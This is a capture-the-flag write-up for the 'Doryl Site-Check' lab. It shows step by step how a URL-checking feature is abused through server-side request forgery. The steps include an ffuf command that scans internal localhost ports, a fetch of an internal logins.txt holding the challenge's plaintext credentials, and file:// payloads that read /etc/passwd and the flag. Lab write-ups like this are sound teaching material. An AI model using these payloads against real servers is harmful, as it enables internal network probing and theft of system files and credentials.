---
id: index
aliases: []
tags:
  - CTF
  - Hack the Box
authors:
  - edson
date: "2024-09-05"
draft: false
showAuthor: false
showAuthorsBadges: false
summary: Resolution of the Doryl site-check challenge
title: Write Up - Doryl Site-Check
---

# CTF Doryl

## How to access the challenge

- Access <https://github.com/fguisso/doryl-site-check>, and start the challenge on
  your machine. In this case, the version delivered was on the `Internal` branch.

## Description

The challenge has the following objectives:

- Find a file with very sensitive information.
- Find a flag in the format secDevOps{.....}

### How the Application Works

- The application has only one input field, used to scan the inserted URL:

![application](https://i.imgur.com/ilyYRAt.png)
- Note that it returns the complete response of the URL that the user inserted.

![application_response_print](https://i.imgur.com/g71XYNY.png)
So it seems that the application internally sends requests to the URL.
In this principle, it is possible to insert a URL to try to access internal servers,
such as `http://localhost`.

- Use the most commonly used web ports in a bruteforce to see if there is any internal port open:
  `80,443,8009,8180,81,300,591,593,832,981,1010,1311,2082,2087,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,12443,16080,18091,18092,20720,28017`.

- Use ffuf to automate the port search, the input is sent in the `target` parameter to the server, and note that I filtered the responses that have 3246 words which I considered as the site's default response.

`ffuf -u http://0.0.0.0:8080/check -X POST -d "target=http%3A%2F%2Flocalhost%3AFUZZ" -w ports.txt -H 'Content-Type: application/x-www-form-urlencoded' -fw 3246`

![print_ffuf_aplicacao](https://i.imgur.com/1eJAAko.png)

- Note that it found only 2 open ports, 8080, which provides the main site, and 3000, which provides an internal application.
- Analyze the complete response when you enter <http://localhost:3000>.


```http
GET http://localhost:3000
Content-Length: 93
Content-Type: text/html; charset=utf-8
Date: Thu, 05 Sep 2024 05:46:30 GMT
Last-Modified: Thu, 05 Sep 2024 01:48:03 GMT
<pre>
<a href="employers.html">employers.html</a>
<a href="logins.txt">logins.txt</a>
</pre>
```

- Note that it has a link to `logins.txt`, when you send the URL
<http://localhost:3000/logins.txt> in the input, it will return very
sensitive information.

```http
GET http://localhost:3000/logins.txt
Accept-Ranges: bytes
Content-Length: 233
Content-Type: text/plain; charset=utf-8
Date: Thu, 05 Sep 2024 05:50:52 GMT
Last-Modified: Thu, 05 Sep 2024 01:48:03 GMT
// Super sensitive information

// WiFi
id: Doryl
password: 2022doryl@*

// Guest WiFi
id: Doryl-Guest
password: dorylguest2022

// Intranet
login: admin
password: Adminqwert2022

// Ginpass
login: dorylAdmin
password: ginAndOrange
```

#### First Step Completed

### Find the FLAG

- Note that the server sends an internal request to the inserted URL,
  using the `http` protocol. Based on this, we can test other common schemes
  to access files on internal servers, such as the `file` scheme.

- Let's try to retrieve a common file on Linux servers, the `/etc/passwd`,
  to check if it returns the content. Enter the URL `file:///etc/passwd` in the input field.


```http
GET file:///etc/passwd

root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
```

- This response is the content of `/etc/passwd`, so we can try to retrieve
  the flag that is stored in the system. It is common in CTFs for the flag to be in the same
  folder as the challenge and named `flag.txt`. Based on this principle, we can
  enter `file://./flag.txt`.

```http
GET file://./flag.txt

SecDevOps{SSRF_3_UM_PERIGOnvim .!}

```

All objectives were completed ( ;

|Challenge Creator: <https://github.com/fguisso>
